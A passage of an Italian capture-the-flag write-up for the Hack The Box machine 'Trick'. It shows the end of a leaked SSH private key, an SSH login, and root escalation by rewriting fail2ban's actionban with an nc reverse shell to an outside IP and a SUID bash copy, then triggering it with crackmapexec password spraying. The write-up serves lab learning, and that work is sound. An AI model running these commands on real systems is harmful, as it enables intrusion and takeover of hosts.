In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY----- 
```

cambiamo la proprietà del file con chmod 600 

e filamente possiamo collegarci tarmattie ssh ottenendo cosi  accesso al macchina 

```bash
┌──(root㉿kali)-[/home/kali/htb/trick]
└─# ssh michael@10.10.11.166 -i id_rsa
The authenticity of host '10.10.11.166 (10.10.11.166)' can't be established.
ED25519 key fingerprint is SHA256:CUKzxire1i5wxTO1zNuBswEtE0u/RyyjZ+v07fOUuYY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.166' (ED25519) to the list of known hosts.
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jul 28 11:38:22 2023 from 10.10.14.2
michael@trick:~$
```

# PRIVESC

per vedere cosa possiamo eseguire senza password sudo -l 

```
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```


michael è anche nel gruppo di sicurezza:

```
michael@trick:~$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```
Questo gruppo non è una cosa standard di Linux. Cercherò i file a cui Michael può accedere che si trovano in quel gruppo usando il comando find. È importante inviare gli errori a /dev/null (ignorarli) altrimenti ogni file o cartella a cui Michael non può accedere genererà un errore.

```
michael@trick:~$ find / -group security 2>/dev/null
/etc/fail2ban/action.d
```

Vediamo che la directory action.d è di proprietà del gruppo security , di cui siamo membri. Anche le autorizzazioni sono impostate su rwxrwx--- , il che significa che il gruppo di sicurezza dispone delle autorizzazioni di lettura, scrittura ed eXecute su questa cartella. Entrando nella directory action.d diamo un'occhiata ai file all'interno.

Prima di abusare di fail2ban, dobbiamo capire come è configurato. Ci sono tre parti in una configurazione fail2ban:

Un filtro definisce i modelli da cercare in un determinato file di registro.
Un'azione definisce qualcosa che può accadere (come una regola di iptables che viene messa in atto).
Una jail collega un filtro a un'azione.

Guardando in /etc/fail2ban/jail.conf, c'è una sezione sshd:

```
[sshd] # To use more aggressive sshd modes set filter parameter "mode" in jail.local: 
# normal (default), ddos, extra or aggressive (combines all). 
# See "tests/files/logs/sshd" or "filter.d/sshd.conf" for usage example and details. 
#mode = normal 
port = ssh 
logpath = %(sshd_log)s 
backend = %(sshd_backend)s 
bantime = 10s
```
C'è anche una sezione [DEFAULT] che si applica a tutti i servizi a meno che non venga ignorata:

```
[DEFAULT] 
...[snip]... 
# "bantime" is the number of seconds that a host is banned. bantime = 10s 
# A host is banned if it has generated "maxretry" during the last "findtime" 
# seconds. findtime = 10s 

# "maxretry" is the number of failures before a host get banned. maxretry = 5 
...[snip]... 
banaction = iptables-multiport 
banaction_allports = iptables-allports 
...[snip]...
```
L'azione predefinita è eseguire iptables-multiport.

Guardando /etc/fail2ban/action.d/iptable-multiport.conf, la riga importante è actionban, che viene eseguita ogni volta che un IP raggiunge la soglia definita:

```
...[snip]... # Option: actionban 
# Notes.: command executed when banning an IP. Take care that the 
# command is executed with Fail2Ban user rights. 
# Tags: See jail.conf(5) man page 
# Values: CMD # 
actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype> ...[snip]...
```
Ora che abbiamo capito come funziona fail2ban

dobbiamo modificare il file iptables-multiport.conf presente in /etc/fail2ban/action.d

Tuttavia, non abbiamo accesso in scrittura a quel file, né è di proprietà di qualcosa a cui possiamo accedere. Tuttavia, la directory è di proprietà di security , il che significa che possiamo spostare i file e sostituirli.

```
# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = /urs/bin/nc -e /usr/bin/bash 10.10.14.18 1337    #questo è il payload per nc

# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>

[Init]
```
Copiamo il file per avere permessi di scrittura 

```
michael@trick:/etc/fail2ban$ mv iptables-multiport.conf .old
michael@trick:/etc/fail2ban$ cp .old iptables-multiport.conf
```
modifichiamo il file alla riga actionban

```
# Option: actionban 
# Notes.: command executed when banning an IP. Take care that the # command is executed with Fail2Ban user rights. 
# Tags: See jail.conf(5) man page # Values: CMD 
# 
actionban = cp /bin/bash /tmp/xRabbit; chmod 4777 /tmp/xRabbit
```
Ricarichiamo le nuove impostazioni

```
michael@trick:/etc/fail2ban$ sudo /etc/init.d/fail2ban restart 
```

Utilizziamo crackmapexec per triggerare il ban di fail2ban

```bash
┌──(root㉿kali)-[/home/kali/htb/trick]
└─# crackmapexec ssh trick.htb -u xRabbit -p /usr/share/wordlists/rockyou.txt
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing LDAP protocol database
[*] Initializing FTP protocol database
[*] Initializing WINRM protocol database
[*] Initializing SSH protocol database
[*] Initializing SMB protocol database
[*] Initializing RDP protocol database
[*] Initializing MSSQL protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SSH         trick.htb       22     trick.htb        [*] SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
SSH         trick.htb       22     trick.htb        [-] xRabbit:123456 Authentication failed.
SSH         trick.htb       22     trick.htb        [-] xRabbit:12345 Authentication failed.
SSH         trick.htb       22     trick.htb        [-] xRabbit:123456789 Authentication failed.
SSH         trick.htb       22     trick.htb        [-] xRabbit:password Authentication failed.
SSH         trick.htb       22     trick.htb        [-] xRabbit:iloveyou Authentication failed.
SSH         trick.htb       22     trick.htb        [-] xRabbit:princess Authentication failed.
SSH         trick.htb       22     trick.htb        [-] xRabbit:1234567 Authentication failed.
```

Notiamo  che questa volta non veniamo bloccati . Questo perché anche quando actionban viene eseguito, non blocca il mio IP in iptables, ma crea piuttosto una bash SetUID. 

```bash
michael@trick:/etc/fail2ban$ ls -l /tmp/xRabbit
-rwsrwxrwx 1 root root 1168776 Oct 15 18:17 /tmp/xRabbit
```

Per attivarlo, dovremmo eseguirlo con [-p](https://www.youtube.com/watch?v=XvfpOIAMx6Y) 
Ciò fornisce una shell (con effettivo uid) come root:

```bash
michael@trick:/tmp$ /tmp/xRabbit -p
0xdf-5.0# id
uid=1001(michael) gid=1001(michael) euid=0(root) groups=1001(michael),1002(security)
0xdf-5.0# cd /root/ls
0xdf: cd: /root/ls: No such file or directory
0xdf-5.0# cd /root/
0xdf-5.0# ls
f2b.sh  fail2ban  root.txt  set_dns.sh
0xdf-5.0# cat root.txt
b55424f5148f623605d045015f78abb1
```
# LESSON LEARNED

Per avere accesso alla macchina abbiamo sfruttato le seguenti vulnerabilità


1. SQL injection  che ci ha permesso di baypassare il login di accesso
2. Virtual Host Enumeration, con relativi subdomini
3. LFI che ci hanno consentito di estrarre informazioni dal databese
4. Invio di email dannosa insieme alla LFI per ottenere una shell

Per aumentare il nostri privilegi abbiamo utilizzato una errata configurazione di fail2ban





